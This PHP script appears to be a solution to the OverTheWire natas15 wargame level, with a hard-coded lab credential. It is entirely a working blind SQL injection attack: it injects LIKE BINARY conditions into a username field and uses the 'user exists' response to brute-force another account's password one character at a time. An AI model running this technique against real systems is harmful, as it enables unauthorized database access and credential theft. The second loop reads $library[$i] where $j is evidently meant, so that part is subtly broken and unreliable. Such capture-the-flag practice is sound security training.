<?php

function post($url, $data)
{
    $username = "natas15";
    $password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J";
    $string = base64_encode("$username:$password");

    $options = [
        'http' => [
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n" . "authorization: Basic $string",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ]
    ];

    $context  = stream_context_create($options);
    $raw_response = file_get_contents($url, false, $context);
    return $raw_response;
}


$c = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
$library = '';

for ($i = 0; $i < strlen($c); $i++)
{
    $character = $c[$i];
    $r = post("http://natas15.natas.labs.overthewire.org/index.php?debug", ['username' => "natas16\" AND password LIKE BINARY \"%$character%\"#"]);
    if (strpos($r, "<br>This user exists.<br>"))
    {
        $library .= $character;
    }
}

$password = '';

for ($i = 0; $i < 32; $i++)
{
    for ($j = 0; $j < strlen($library); $j++)
    {
        $character = $library[$i];
        $r = post("http://natas15.natas.labs.overthewire.org/index.php?debug", ['username' => "natas16\" AND password LIKE BINARY \"$password$character%\"#"]);
        if (strpos($r, "<br>This user exists.<br>"))
        {
            $password .= $character;
            echo "$password\n";
        }
    }
}